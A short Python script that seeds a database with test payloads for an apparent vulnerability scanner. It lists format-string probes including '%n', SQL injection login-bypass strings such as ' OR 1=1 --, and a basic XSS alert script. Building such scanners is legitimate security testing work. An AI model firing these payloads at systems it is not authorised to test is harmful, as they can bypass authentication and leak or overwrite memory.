from backend.crud import create_payload
from backend.database import SessionLocal
from backend.models import VulType

db = SessionLocal()

#format_string bug vulnerability
create_payload(db, VulType.FORMAT_STRING, "%x")
create_payload(db, VulType.FORMAT_STRING, "%s")
create_payload(db, VulType.FORMAT_STRING, "%p")
create_payload(db, VulType.FORMAT_STRING, "%n")
create_payload(db, VulType.FORMAT_STRING, "%x %x %x %x")
create_payload(db, VulType.FORMAT_STRING, "%p %p %p %p")
create_payload(db, VulType.FORMAT_STRING, "%s %s %s %s")
create_payload(db, VulType.FORMAT_STRING, "%08x.%08x.%08x.%08x")
create_payload(db, VulType.FORMAT_STRING, "%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%s")


create_payload(db, VulType.SQL_INJECTION, "' OR 1=1 --")
create_payload(db, VulType.SQL_INJECTION, "' OR ''='")
create_payload(db, VulType.SQL_INJECTION, "' OR 'a'='a")
create_payload(db, VulType.SQL_INJECTION, "' OR 1=1#")
create_payload(db, VulType.XSS, "<script>alert('XSS')</script>")

db.close()